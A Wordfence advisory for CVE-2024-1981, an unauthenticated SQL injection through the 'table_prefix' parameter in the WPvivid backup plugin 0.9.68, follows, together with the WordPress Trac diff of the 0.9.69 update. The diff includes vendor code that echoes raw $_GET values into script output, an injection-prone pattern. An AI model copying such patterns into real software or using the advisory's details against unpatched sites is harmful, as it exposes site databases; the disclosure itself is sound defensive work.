=== Content from www.wordfence.com_69d30dba_20250110_130442.html ===


[![](https://www.wordfence.com/img/wordfence-intelligence-logo.svg)](/threat-intel/)

Have you found a vulnerability in a WordPress plugin or theme? Report vulnerabilities in WordPress plugins and themes through our [bug bounty program](https://www.wordfence.com/threat-intel/bug-bounty-program) and earn a bounty on all in-scope submissions, while we handle the responsible disclosure process on your behalf.

As a reminder, the Wordfence Intelligence Vulnerability Database API is completely free to query and utilize, both personally and commercially, and contains all the same vulnerability data as the user interface. Please review the API documentation and Webhook documentation for more information on how to query the vulnerability API endpoints and configure webhooks utilizing all the same data present in the Wordfence Intelligence user interface.

# WPvivid Backup and Migration <= 0.9.68 - Unauthenticated SQL Injection

 [Wordfence Intelligence](https://www.wordfence.com/threat-intel)   >    [Vulnerability Database](https://www.wordfence.com/threat-intel/vulnerabilities)   >   WPvivid Backup and Migration <= 0.9.68 - Unauthenticated SQL Injection

9.8

**Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')**
**CVSS Vector**
[CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

| CVE | [CVE-2024-1981](https://www.cve.org/CVERecord?id=CVE-2024-1981) |
| --- | --- |
| CVSS | 9.8 (Critical) |
| Publicly Published | February 28, 2024 |
| Last Updated | February 29, 2024 |
| Researcher | [Denis Werner - HiSolutions AG](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/denis-werner) |

### Description

The Migration, Backup, Staging – WPvivid plugin for WordPress is vulnerable to SQL Injection via the 'table\_prefix' parameter in version 0.9.68 due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query. This makes it possible for unauthenticated attackers to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database.

#### References

* [research.hisolutions.com](https://research.hisolutions.com/2024/01/multiple-vulnerabilities-in-wordpress-plugin-wpvivid-backup-and-migration/)
* [plugins.trac.wordpress.org](https://plugins.trac.wordpress.org/changeset?old_path=%2Fwpvivid-backuprestore%2Ftrunk&old=2667839&new_path=%2Fwpvivid-backuprestore%2Ftrunk&new=2667839)

#### Share

[Facebook](https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fwordpress-plugins%2Fwpvivid-backuprestore%2Fwpvivid-backup-and-migration-0968-unauthenticated-sql-injection&t=WPvivid%20Backup%20and%20Migration%20%3C%3D%200.9.68%20-%20Unauthenticated%20SQL%20Injection "Facebook")
[Twitter](https://twitter.com/share?url=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fwordpress-plugins%2Fwpvivid-backuprestore%2Fwpvivid-backup-and-migration-0968-unauthenticated-sql-injection&text=WPvivid%20Backup%20and%20Migration%20%3C%3D%200.9.68%20-%20Unauthenticated%20SQL%20Injection "Twitter")
[LinkedIn](https://www.linkedin.com/shareArticle?url=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fwordpress-plugins%2Fwpvivid-backuprestore%2Fwpvivid-backup-and-migration-0968-unauthenticated-sql-injection "LinkedIn")
Email

## Vulnerability Details for Migration, Backup, Staging – WPvivid Backup & Migration

#### [Migration, Backup, Staging – WPvivid Backup & Migration](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/wpvivid-backuprestore)

| Software Type | Plugin |
| --- | --- |
| Software Slug | wpvivid-backuprestore [(view on wordpress.org)](https://wordpress.org/plugins/wpvivid-backuprestore) |
| Patched? | Yes |
| Remediation | Update to version 0.9.69, or a newer patched version |
| Affected Version | * 0.9.68 |
| Patched Version | * 0.9.69 |

This record contains material that is subject to copyright.

**Copyright 2012-2025 Defiant Inc.**

**License:**
Defiant hereby grants you a perpetual, worldwide, non-exclusive, no-charge, royalty-free, irrevocable copyright license to reproduce, prepare derivative works of, publicly display, publicly perform, sublicense, and distribute this software vulnerability information. Any copy of the software vulnerability information you make for such purposes is authorized provided that you include a hyperlink to this vulnerability record and reproduce Defiant's copyright designation and this license in any such copy.
**[Read more.](https://www.wordfence.com/wordfence-intelligence-terms-and-conditions/)**

**Copyright 1999-2025 The MITRE Corporation**

**License:**
CVE Usage: MITRE hereby grants you a perpetual, worldwide, non-exclusive, no-charge, royalty-free, irrevocable copyright license to reproduce, prepare derivative works of, publicly display, publicly perform, sublicense, and distribute Common Vulnerabilities and Exposures (CVE®). Any copy you make for such purposes is authorized provided that you reproduce MITRE's copyright designation and this license in any such copy.
**[Read more.](https://www.cve.org/Legal/TermsOfUse)**

Have information to add, or spot any errors? Contact us at wfi-support@wordfence.com so we can make any appropriate adjustments.

Did you know Wordfence Intelligence provides free personal and commercial API access to our comprehensive WordPress vulnerability database, along with a free webhook integration to stay on top of the latest vulnerabilities added and updated in the database? Get started today!

Learn more

Want to get notified of the latest vulnerabilities that may affect your WordPress site?
 Install Wordfence on your site today to get notified immediately if your site is affected by a vulnerability that has been added to our database.

Get Wordfence

The Wordfence Intelligence WordPress vulnerability database is completely free to access and query via API. Please review the documentation on how to access and consume the vulnerability data via API.

Documentation



=== Content from plugins.trac.wordpress.org_591b16ab_20250110_130441.html ===


[Skip to content](#main)

[WordPress.org](https://wordpress.org/)

* [News](https://wordpress.org/news/)
* [Download & Extend](https://wordpress.org/download/)
  + [Get WordPress](https://wordpress.org/download/)
  + [Themes](https://wordpress.org/themes/)
  + [Patterns](https://wordpress.org/patterns/)
  + [Plugins](https://wordpress.org/plugins/)
  + [Mobile](https://wordpress.org/mobile/)
  + [Hosting](https://wordpress.org/hosting/)
  + [Openverse ↗︎](https://openverse.org/)
* [Learn](https://learn.wordpress.org/)
  + [Learn WordPress](https://learn.wordpress.org/)
  + [Documentation](https://wordpress.org/documentation/)
  + [Forums](https://wordpress.org/support/forums/)
  + [Developers](https://developer.wordpress.org/)
  + [WordPress.tv ↗︎](https://wordpress.tv/)
* [Community](https://make.wordpress.org/)
  + [Make WordPress](https://make.wordpress.org/)
  + [Photo Directory](https://wordpress.org/photos/)
  + [Five for the Future](https://wordpress.org/five-for-the-future/)
  + [WordCamp ↗︎](https://central.wordcamp.org/)
  + [Meetups ↗︎](https://www.meetup.com/pro/wordpress/)
  + [Job Board ↗︎](https://jobs.wordpress.net/)
* [About](https://wordpress.org/about/)
  + [About WordPress](https://wordpress.org/about/)
  + [Showcase](https://wordpress.org/showcase/)
  + [Enterprise](https://wordpress.org/enterprise/)
  + [Gutenberg ↗︎](https://wordpress.org/gutenberg/)
  + [WordPress Swag Store ↗︎](https://mercantile.wordpress.org/)
* [Get WordPress](https://wordpress.org/download/)

Search Trac

[Get WordPress](https://wordpress.org/download/)

## [Plugin Directory](//wordpress.org/plugins/)

Search:

* [Login](https://login.wordpress.org/?redirect_to=http%3A%2F%2Fplugins.trac.wordpress.org%2Fchangeset%3Fnew_path%3D%252Fwpvivid-backuprestore%252Ftrunk%26old%3D2667839%26new%3D2667839%26old_path%3D%252Fwpvivid-backuprestore%252Ftrunk)

* [Timeline](/timeline)
* [View Tickets](/report)
* [Browse Source](/browser)

## Context Navigation

* ← [Previous Change](/changeset/2661194/wpvivid-backuprestore/trunk "Changeset 2661194 for wpvivid-backuprestore/trunk")
* [Next Change](/changeset/2694141/wpvivid-backuprestore/trunk "Changeset 2694141 for wpvivid-backuprestore/trunk") →

---

# Changeset [2667839](/changeset/2667839 "Show full changeset") for [wpvivid-backuprestore/trunk](/browser/wpvivid-backuprestore/trunk?rev=2667839 "Show entry in browser")

View differences
inline
side by side

Show
lines around each change

Show the changes in full context

Ignore:

Blank lines

Case changes

White space changes

Timestamp:
01/28/2022 06:10:05 AM
([3 years](/timeline?from=2022-01-28T06%3A10%3A05Z&precision=second "See timeline at 01/28/2022 06:10:05 AM") ago)

Author:
wpvivid
Message:

update for 0.9.69

Location:
[wpvivid-backuprestore/trunk](/browser/wpvivid-backuprestore/trunk?rev=2667839)
Files:

19 edited

* [admin/partials/wpvivid-admin-display.php](/browser/wpvivid-backuprestore/trunk/admin/partials/wpvivid-admin-display.php?rev=2667839 "Show entry in browser")
  (modified)
  ([3 diffs](#file0 "Show differences"))
* [admin/partials/wpvivid-backup-restore-page-display.php](/browser/wpvivid-backuprestore/trunk/admin/partials/wpvivid-backup-restore-page-display.php?rev=2667839 "Show entry in browser")
  (modified)
  ([1 diff](#file1 "Show differences"))
* [admin/partials/wpvivid-settings-page-display.php](/browser/wpvivid-backuprestore/trunk/admin/partials/wpvivid-settings-page-display.php?rev=2667839 "Show entry in browser")
  (modified)
  ([4 diffs](#file2 "Show differences"))
* [includes/class-wpvivid-compress-default.php](/browser/wpvivid-backuprestore/trunk/includes/class-wpvivid-compress-default.php?rev=2667839 "Show entry in browser")
  (modified)
  ([1 diff](#file3 "Show differences"))
* [includes/class-wpvivid-log.php](/browser/wpvivid-backuprestore/trunk/includes/class-wpvivid-log.php?rev=2667839 "Show entry in browser")
  (modified)
  ([3 diffs](#file4 "Show differences"))
* [includes/class-wpvivid-mysqldump.php](/browser/wpvivid-backuprestore/trunk/includes/class-wpvivid-mysqldump.php?rev=2667839 "Show entry in browser")
  (modified)
  ([1 diff](#file5 "Show differences"))
* [includes/class-wpvivid.php](/browser/wpvivid-backuprestore/trunk/includes/class-wpvivid.php?rev=2667839 "Show entry in browser")
  (modified)
  ([13 diffs](#file6 "Show differences"))
* [includes/customclass/class-wpvivid-base-dropbox.php](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-base-dropbox.php?rev=2667839 "Show entry in browser")
  (modified)
  ([4 diffs](#file7 "Show differences"))
* [includes/customclass/class-wpvivid-dropbox.php](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-dropbox.php?rev=2667839 "Show entry in browser")
  (modified)
  ([10 diffs](#file8 "Show differences"))
* [includes/customclass/class-wpvivid-google-drive.php](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-google-drive.php?rev=2667839 "Show entry in browser")
  (modified)
  ([8 diffs](#file9 "Show differences"))
* [includes/customclass/class-wpvivid-one-drive.php](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-one-drive.php?rev=2667839 "Show entry in browser")
  (modified)
  ([12 diffs](#file10 "Show differences"))
* [includes/customclass/class-wpvivid-s3compat.php](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-s3compat.php?rev=2667839 "Show entry in browser")
  (modified)
  ([1 diff](#file11 "Show differences"))
* [includes/lib/google-api-php-client/src/Google/Client.php](/browser/wpvivid-backuprestore/trunk/includes/lib/google-api-php-client/src/Google/Client.php?rev=2667839 "Show entry in browser")
  (modified)
  ([1 diff](#file12 "Show differences"))
* [includes/staging/class-wpvivid-staging-log-page.php](/browser/wpvivid-backuprestore/trunk/includes/staging/class-wpvivid-staging-log-page.php?rev=2667839 "Show entry in browser")
  (modified)
  ([2 diffs](#file13 "Show differences"))
* [includes/staging/class-wpvivid-staging-log.php](/browser/wpvivid-backuprestore/trunk/includes/staging/class-wpvivid-staging-log.php?rev=2667839 "Show entry in browser")
  (modified)
  ([3 diffs](#file14 "Show differences"))
* [includes/staging/class-wpvivid-staging-setting.php](/browser/wpvivid-backuprestore/trunk/includes/staging/class-wpvivid-staging-setting.php?rev=2667839 "Show entry in browser")
  (modified)
  ([2 diffs](#file15 "Show differences"))
* [includes/staging/class-wpvivid-staging.php](/browser/wpvivid-backuprestore/trunk/includes/staging/class-wpvivid-staging.php?rev=2667839 "Show entry in browser")
  (modified)
  ([1 diff](#file16 "Show differences"))
* [readme.txt](/browser/wpvivid-backuprestore/trunk/readme.txt?rev=2667839 "Show entry in browser")
  (modified)
  ([previous](/browser/wpvivid-backuprestore/trunk/readme.txt?rev=2661194 "Show previous version in browser"))
* [wpvivid-backuprestore.php](/browser/wpvivid-backuprestore/trunk/wpvivid-backuprestore.php?rev=2667839 "Show entry in browser")
  (modified)
  ([2 diffs](#file18 "Show differences"))

### Legend:

Unmodified
Added
Removed

* ## [wpvivid-backuprestore/trunk/admin/partials/wpvivid-admin-display.php](/changeset/2667839/wpvivid-backuprestore/trunk/admin/partials/wpvivid-admin-display.php "Show the changeset 2667839 restricted to wpvivid-backuprestore/trunk/admin/partials/wpvivid-admin-display.php")

  | [r2580243](/browser/wpvivid-backuprestore/trunk/admin/partials/wpvivid-admin-display.php?rev=2580243#L120 "Show revision 2580243 of this file in browser") | [r2667839](/browser/wpvivid-backuprestore/trunk/admin/partials/wpvivid-admin-display.php?rev=2667839#L120 "Show revision 2667839 of this file in browser") |  |
  | --- | --- | --- |
  | 120 | 120 | evt.currentTarget.className += " nav-tab-active"; |
  | 121 | 121 | jQuery( document ).trigger( 'wpvivid-switch-tabs', contentName ); |
  |  | 122 | //nav-tab-active |
  | 122 | 123 | } |
  | 123 | 124 | function switchrestoreTabs(evt,contentName) { |
  | […](/browser/wpvivid-backuprestore/trunk/admin/partials/wpvivid-admin-display.php?rev=2580243#L181) | […](/browser/wpvivid-backuprestore/trunk/admin/partials/wpvivid-admin-display.php?rev=2667839#L182) |  |
  | 181 | 182 | evt.currentTarget.className += " nav-tab-active"; |
  | 182 | 183 | } |
  |  | 184 | function switchstorageTabs(remote\_type,storage\_page\_id) |
  |  | 185 | { |
  |  | 186 | var i, tabcontent, tablinks,contentName; |
  |  | 187 | contentName='storage-page'; |
  |  | 188 | // Get all elements with class="tabcontent" and hide them |
  |  | 189 | tabcontent = document.getElementsByClassName("wrap-tab-content"); |
  |  | 190 | for (i = 0; i < tabcontent.length; i++) { |
  |  | 191 | tabcontent[i].style.display = "none"; |
  |  | 192 | } |
  |  | 193 |  |
  |  | 194 | // Get all elements with class="wrap-nav-tab" and remove the class "active" |
  |  | 195 | tablinks = document.getElementsByClassName("wrap-nav-tab"); |
  |  | 196 | for (i = 0; i < tablinks.length; i++) { |
  |  | 197 | tablinks[i].className = tablinks[i].className.replace(" nav-tab-active", ""); |
  |  | 198 | } |
  |  | 199 |  |
  |  | 200 | // Show the current tab, and add an "nav-tab-active" class to the button that opened the tab |
  |  | 201 | document.getElementById(contentName).style.display = "block"; |
  |  | 202 | jQuery('#wpvivid\_tab\_remote\_storage').addClass('nav-tab-active'); |
  |  | 203 | jQuery( document ).trigger( 'wpvivid-switch-tabs', contentName ); |
  |  | 204 | start\_select\_remote\_storage(remote\_type,storage\_page\_id); |
  |  | 205 |  |
  |  | 206 | } |
  |  | 207 |  |
  |  | 208 | function start\_select\_remote\_storage(remote\_type, storage\_page\_id) |
  |  | 209 | { |
  |  | 210 | var i, tablecontent, tablinks; |
  |  | 211 | tablinks = document.getElementsByClassName("storage-providers"); |
  |  | 212 | for (i = 0; i < tablinks.length; i++) { |
  |  | 213 | tablinks[i].className = tablinks[i].className.replace("storage-providers-active", ""); |
  |  | 214 | } |
  |  | 215 | jQuery("div[remote\_type='"+remote\_type+"']").addClass('storage-providers-active'); |
  |  | 216 |  |
  |  | 217 | jQuery(".storage-account-page").hide(); |
  |  | 218 | jQuery("#"+storage\_page\_id).show(); |
  |  | 219 | } |
  |  | 220 |  |
  | 183 | 221 | function wpvivid\_getrequest() |
  | 184 | 222 | { |
  | […](/browser/wpvivid-backuprestore/trunk/admin/partials/wpvivid-admin-display.php?rev=2580243#L217) | […](/browser/wpvivid-backuprestore/trunk/admin/partials/wpvivid-admin-display.php?rev=2667839#L255) |  |
  | 217 | 255 | } |
  | 218 | 256 | ?> |
  |  | 257 |  |
  |  | 258 | <?php |
  |  | 259 | if (isset($\_GET['main\_tab'])) |
  |  | 260 | { |
  |  | 261 | $tab=esc\_html($\_GET['main\_tab']); |
  |  | 262 |  |
  |  | 263 | if($tab=='storage') |
  |  | 264 | { |
  |  | 265 | $sub\_tab=isset($\_GET['sub\_tab'])?$\_GET['sub\_tab']:'googledrive'; |
  |  | 266 | $sub\_page=isset($\_GET['sub\_page'])?$\_GET['sub\_page']:'storage\_account\_google\_drive'; |
  |  | 267 | echo "switchstorageTabs('$sub\_tab','$sub\_page');"; |
  |  | 268 | } |
  |  | 269 | } |
  |  | 270 | ?> |
  |  | 271 | //switchTabs(event,'storage-page') |
  | 219 | 272 | }); |
  | 220 | 273 |  |
* ## [wpvivid-backuprestore/trunk/admin/partials/wpvivid-backup-restore-page-display.php](/changeset/2667839/wpvivid-backuprestore/trunk/admin/partials/wpvivid-backup-restore-page-display.php "Show the changeset 2667839 restricted to wpvivid-backuprestore/trunk/admin/partials/wpvivid-backup-restore-page-display.php")

  | [r2615569](/browser/wpvivid-backuprestore/trunk/admin/partials/wpvivid-backup-restore-page-display.php?rev=2615569#L1637 "Show revision 2615569 of this file in browser") | [r2667839](/browser/wpvivid-backuprestore/trunk/admin/partials/wpvivid-backup-restore-page-display.php?rev=2667839#L1637 "Show revision 2667839 of this file in browser") |  |
  | --- | --- | --- |
  | 1637 | 1637 | 'action':'wpvivid\_get\_restore\_progress', |
  | 1638 | 1638 | 'wpvivid\_restore' : '1', |
  |  | 1639 | 'backup\_id':m\_restore\_backup\_id, |
  | 1639 | 1640 | }; |
  | 1640 | 1641 |  |
* ## [wpvivid-backuprestore/trunk/admin/partials/wpvivid-settings-page-display.php](/changeset/2667839/wpvivid-backuprestore/trunk/admin/partials/wpvivid-settings-page-display.php "Show the changeset 2667839 restricted to wpvivid-backuprestore/trunk/admin/partials/wpvivid-settings-page-display.php")

  | [r2551237](/browser/wpvivid-backuprestore/trunk/admin/partials/wpvivid-settings-page-display.php?rev=2551237#L299 "Show revision 2551237 of this file in browser") | [r2667839](/browser/wpvivid-backuprestore/trunk/admin/partials/wpvivid-settings-page-display.php?rev=2667839#L299 "Show revision 2667839 of this file in browser") |  |
  | --- | --- | --- |
  | 299 | 299 | { |
  | 300 | 300 | global $wpvivid\_plugin; |
  | 301 |  | $junk\_file=$wpvivid\_plugin->\_junk\_files\_info(); |
  |  | 301 | //$junk\_file=$wpvivid\_plugin->\_junk\_files\_info(); |
  |  | 302 | $junk\_file['sum\_size']=0; |
  |  | 303 | $junk\_file['log\_dir\_size']=0; |
  |  | 304 | $junk\_file['backup\_dir\_size'] =0; |
  |  | 305 | $junk\_file['log\_path'] = $log\_dir = $wpvivid\_plugin->wpvivid\_log->GetSaveLogFolder(); |
  |  | 306 | $dir = WPvivid\_Setting::get\_backupdir(); |
  |  | 307 | $junk\_file['old\_files\_path'] = WP\_CONTENT\_DIR . DIRECTORY\_SEPARATOR . $dir . DIRECTORY\_SEPARATOR . WPVIVID\_DEFAULT\_ROLLBACK\_DIR; |
  |  | 308 | $dir = WP\_CONTENT\_DIR . DIRECTORY\_SEPARATOR . $dir; |
  |  | 309 | $junk\_file['junk\_path'] = $dir; |
  | 302 | 310 | ?> |
  | 303 | 311 | <div class="postbox schedule-tab-block" id="wpvivid\_clean\_junk"> |
  | […](/browser/wpvivid-backuprestore/trunk/admin/partials/wpvivid-settings-page-display.php?rev=2551237#L431) | […](/browser/wpvivid-backuprestore/trunk/admin/partials/wpvivid-settings-page-display.php?rev=2667839#L439) |  |
  | 431 | 439 | } |
  | 432 | 440 | } |
  |  | 441 |  |
  |  | 442 | jQuery(document).ready(function () |
  |  | 443 | { |
  |  | 444 | wpvivid\_calculate\_diskspaceused(); |
  |  | 445 | }); |
  | 433 | 446 | </script> |
  | 434 | 447 | <?php |
  | […](/browser/wpvivid-backuprestore/trunk/admin/partials/wpvivid-settings-page-display.php?rev=2551237#L614) | […](/browser/wpvivid-backuprestore/trunk/admin/partials/wpvivid-settings-page-display.php?rev=2667839#L627) |  |
  | 614 | 627 | <div><strong><?php \_e('Compress Files Every', 'wpvivid-backuprestore'); ?></strong></div> |
  | 615 | 628 | <div class="setting-tab-block"> |
  | 616 |  | <input type="text" placeholder="~~4~~00" option="setting" name="max\_file\_size" id="wpvivid\_max\_zip" class="all-options" value="<?php esc\_attr\_e(str\_replace('M', '', $general\_setting['options']['wpvivid\_compress\_setting']['max\_file\_size']), 'wpvivid-backuprestore'); ?>" onkeyup="value=value.replace(/\D/g,'')" />MB |
  |  | 629 | <input type="text" placeholder="200" option="setting" name="max\_file\_size" id="wpvivid\_max\_zip" class="all-options" value="<?php esc\_attr\_e(str\_replace('M', '', $general\_setting['options']['wpvivid\_compress\_setting']['max\_file\_size']), 'wpvivid-backuprestore'); ?>" onkeyup="value=value.replace(/\D/g,'')" />MB |
  | 617 | 630 | <div><p><?php \_e( 'Some web hosting providers limit large zip files (e.g. 200MB), and therefore splitting your backup into many parts is an ideal way to avoid hitting the limitation if you are running a big website.  Please try to adjust the value if you are encountering backup errors. If you use a value of 0 MB, any backup files won\'t be split.', 'wpvivid-backuprestore' ); ?></div></p> |
  | 618 | 631 | </div> |
  | 619 | 632 | <div><strong><?php \_e('Exclude the files which are larger than', 'wpvivid-backuprestore'); ?></strong></div> |
  | 620 | 633 | <div class="setting-tab-block"> |
  | 621 |  | <input type="text" placeholder="~~40~~0" option="setting" name="exclude\_file\_size" id="wpvivid\_ignore\_large" class="all-options" value="<?php esc\_attr\_e($general\_setting['options']['wpvivid\_compress\_setting']['exclude\_file\_size'], 'wpvivid-backuprestore'); ?>" onkeyup="value=value.replace(/\D/g,'')" />MB |
  |  | 634 | <input type="text" placeholder="0" option="setting" name="exclude\_file\_size" id="wpvivid\_ignore\_large" class="all-options" value="<?php esc\_attr\_e($general\_setting['options']['wpvivid\_compress\_setting']['exclude\_file\_size'], 'wpvivid-backuprestore'); ?>" onkeyup="value=value.replace(/\D/g,'')" />MB |
  | 622 | 635 | <div><p><?php \_e( 'Using the option will ignore the file larger than the certain size in MB when backing up, \'0\' (zero) means unlimited.', 'wpvivid-backuprestore' ); ?></p></div> |
  | 623 | 636 | </div> |
  | 624 | 637 | <div><strong><?php \_e('PHP script execution timeout for backup', 'wpvivid-backuprestore'); ?></strong></div> |
  | 625 | 638 | <div class="setting-tab-block"> |
  | 626 |  | <input type="text" placeholder="~~6~~00" option="setting" name="max\_execution\_time" id="wpvivid\_option\_timeout" class="all-options" value="<?php esc\_attr\_e($general\_setting['options']['wpvivid\_common\_setting']['max\_execution\_time'], 'wpvivid-backuprestore'); ?>" onkeyup="value=value.replace(/\D/g,'')" />Seconds |
  |  | 639 | <input type="text" placeholder="900" option="setting" name="max\_execution\_time" id="wpvivid\_option\_timeout" class="all-options" value="<?php esc\_attr\_e($general\_setting['options']['wpvivid\_common\_setting']['max\_execution\_time'], 'wpvivid-backuprestore'); ?>" onkeyup="value=value.replace(/\D/g,'')" />Seconds |
  | 627 | 640 | <div><p><?php \_e( 'The time-out is not your server PHP time-out. With the execution time exhausted, our plugin will shut the process of backup down. If the progress of backup encounters a time-out, that means you have a medium or large sized website, please try to scale the value bigger.', 'wpvivid-backuprestore' ); ?></p></div> |
  | 628 | 641 | </div> |
  | […](/browser/wpvivid-backuprestore/trunk/admin/partials/wpvivid-settings-page-display.php?rev=2551237#L644) | […](/browser/wpvivid-backuprestore/trunk/admin/partials/wpvivid-settings-page-display.php?rev=2667839#L657) |  |
  | 644 | 657 | <div><strong><?php \_e('Chunk Size', 'wpvivid-backuprestore'); ?></strong></div> |
  | 645 | 658 | <div class="setting-tab-block"> |
  | 646 |  | <input type="text" placeholder="2" option="setting" name="migrate\_size" class="all-options" value="<?php esc\_attr\_e($general\_setting['options']['wpvivid\_common\_setting']['migrate\_size']); ?>" onkeyup="value=value.replace(/\D/g,'')" />KB |
  |  | 659 | <input type="text" placeholder="2048" option="setting" name="migrate\_size" class="all-options" value="<?php esc\_attr\_e($general\_setting['options']['wpvivid\_common\_setting']['migrate\_size']); ?>" onkeyup="value=value.replace(/\D/g,'')" />KB |
  | 647 | 660 | <div><p><?php \_e('e.g.  if you choose a chunk size of 2MB, a 8MB file will use 4 chunks. Decreasing this value will break the ISP\'s transmission limit, for example:512KB', 'wpvivid-backuprestore'); ?></p></div> |
  | 648 | 661 | </div> |
* ## [wpvivid-backuprestore/trunk/includes/class-wpvivid-compress-default.php](/changeset/2667839/wpvivid-backuprestore/trunk/includes/class-wpvivid-compress-default.php "Show the changeset 2667839 restricted to wpvivid-backuprestore/trunk/includes/class-wpvivid-compress-default.php")

  | [r2236889](/browser/wpvivid-backuprestore/trunk/includes/class-wpvivid-compress-default.php?rev=2236889#L28 "Show revision 2236889 of this file in browser") | [r2667839](/browser/wpvivid-backuprestore/trunk/includes/class-wpvivid-compress-default.php?rev=2667839#L28 "Show revision 2667839 of this file in browser") |  |
  | --- | --- | --- |
  | 28 | 28 | public function filesplit($max\_size,$files){ |
  | 29 | 29 | $packages = array(); |
  | 30 |  | if($max\_size == 0 || empty($max\_size)){ |
  |  | 30 | if($max\_size == 0 || $max\_size === '0M' || empty($max\_size)){ |
  | 31 | 31 | $packages[] = $files; |
  | 32 | 32 | }else{ |
* ## [wpvivid-backuprestore/trunk/includes/class-wpvivid-log.php](/changeset/2667839/wpvivid-backuprestore/trunk/includes/class-wpvivid-log.php "Show the changeset 2667839 restricted to wpvivid-backuprestore/trunk/includes/class-wpvivid-log.php")

  | [r2623689](/browser/wpvivid-backuprestore/trunk/includes/class-wpvivid-log.php?rev=2623689#L29 "Show revision 2623689 of this file in browser") | [r2667839](/browser/wpvivid-backuprestore/trunk/includes/class-wpvivid-log.php?rev=2667839#L29 "Show revision 2667839 of this file in browser") |  |
  | --- | --- | --- |
  | 29 | 29 | } |
  | 30 | 30 | $this->log\_file\_handle = fopen($this->log\_file, 'a'); |
  | 31 |  | $time =date("Y-m-d H:i:s",time()); |
  |  | 31 | $offset=get\_option('gmt\_offset'); |
  |  | 32 | $time =date("Y-m-d H:i:s",time()+$offset\*60\*60); |
  | 32 | 33 | $text='Log created: '.$time."\n"; |
  | 33 | 34 | $text.='Type: '.$describe."\n"; |
  | […](/browser/wpvivid-backuprestore/trunk/includes/class-wpvivid-log.php?rev=2623689#L60) | […](/browser/wpvivid-backuprestore/trunk/includes/class-wpvivid-log.php?rev=2667839#L61) |  |
  | 60 | 61 | if ($this->log\_file\_handle) |
  | 61 | 62 | { |
  | 62 |  | $time =date("Y-m-d H:i:s",time()); |
  |  | 63 | $offset=get\_option('gmt\_offset'); |
  |  | 64 | $time =date("Y-m-d H:i:s",time()+$offset\*60\*60); |
  | 63 | 65 | $text='['.$time.']'.'['.$type.']'.$log."\n"; |
  | 64 | 66 | fwrite($this->log\_file\_handle,$text ); |
  | […](/browser/wpvivid-backuprestore/trunk/includes/class-wpvivid-log.php?rev=2623689#L167) | […](/browser/wpvivid-backuprestore/trunk/includes/class-wpvivid-log.php?rev=2667839#L169) |  |
  | 167 | 169 | } |
  | 168 | 170 |  |
  | 169 |  | $time =date("Y-m-d H:i:s",time()); |
  |  | 171 | $offset=get\_option('gmt\_offset'); |
  |  | 172 | $time =date("Y-m-d H:i:s",time()+$offset\*60\*60); |
  | 170 | 173 | $text='['.$time.']'.'[notice]'.$log."\n"; |
  | 171 | 174 | fwrite($this->log\_file\_handle,$text ); |
* ## [wpvivid-backuprestore/trunk/includes/class-wpvivid-mysqldump.php](/changeset/2667839/wpvivid-backuprestore/trunk/includes/class-wpvivid-mysqldump.php "Show the changeset 2667839 restricted to wpvivid-backuprestore/trunk/includes/class-wpvivid-mysqldump.php")

  | [r2347113](/browser/wpvivid-backuprestore/trunk/includes/class-wpvivid-mysqldump.php?rev=2347113#L117 "Show revision 2347113 of this file in browser") | [r2667839](/browser/wpvivid-backuprestore/trunk/includes/class-wpvivid-mysqldump.php?rev=2667839#L117 "Show revision 2667839 of this file in browser") |  |
  | --- | --- | --- |
  | 117 | 117 | 'default-character-set' => WPvivid\_Mysqldump::UTF8, |
  | 118 | 118 | 'disable-keys' => true, |
  | 119 |  | 'extended-insert' => ~~tru~~e, |
  |  | 119 | 'extended-insert' => false, |
  | 120 | 120 | 'events' => false, |
  | 121 | 121 | 'hex-blob' => true, /\* faster than escaped content \*/ |
* ## [wpvivid-backuprestore/trunk/includes/class-wpvivid.php](/changeset/2667839/wpvivid-backuprestore/trunk/includes/class-wpvivid.php "Show the changeset 2667839 restricted to wpvivid-backuprestore/trunk/includes/class-wpvivid.php")

  | [r2661194](/browser/wpvivid-backuprestore/trunk/includes/class-wpvivid.php?rev=2661194#L365 "Show revision 2661194 of this file in browser") | [r2667839](/browser/wpvivid-backuprestore/trunk/includes/class-wpvivid.php?rev=2667839#L365 "Show revision 2667839 of this file in browser") |  |
  | --- | --- | --- |
  | 365 | 365 | add\_action('wp\_ajax\_wpvivid\_get\_download\_restore\_progress',array( $this,'download\_restore\_progress')); |
  | 366 | 366 | //When restoring the database use wp\_ajax\_nopriv\_ |
  | 367 |  | ~~add\_action('wp\_ajax\_nopriv\_wpvivid\_init\_restore\_page',array( $this,'init\_restore\_page'));~~ |
  | 368 |  | ~~add\_action('wp\_ajax\_nopriv\_wpvivid\_delete\_last\_restore\_data',array( $this,'delete\_last\_restore\_data'));~~ |
  | 369 | 367 | add\_action('wp\_ajax\_nopriv\_wpvivid\_restore',array( $this,'restore')); |
  | 370 | 368 | add\_action('wp\_ajax\_nopriv\_wpvivid\_get\_restore\_progress',array( $this,'get\_restore\_progress')); |
  | […](/browser/wpvivid-backuprestore/trunk/includes/class-wpvivid.php?rev=2661194#L1228) | […](/browser/wpvivid-backuprestore/trunk/includes/class-wpvivid.php?rev=2667839#L1226) |  |
  | 1228 | 1226 | die(); |
  | 1229 | 1227 | } |
  | 1230 |  | catch (Error $e) |
  | 1231 |  | { |
  | 1232 |  | //catch error and stop task recording history |
  | 1233 |  | $this->deal\_task\_error($task\_id,'error',$e); |
  | 1234 |  | $this->wpvivid\_log->CloseFile(); |
  | 1235 |  | $this->end\_shutdown\_function=true; |
  | 1236 |  | die(); |
  | 1237 |  | } |
  |  | 1228 |  |
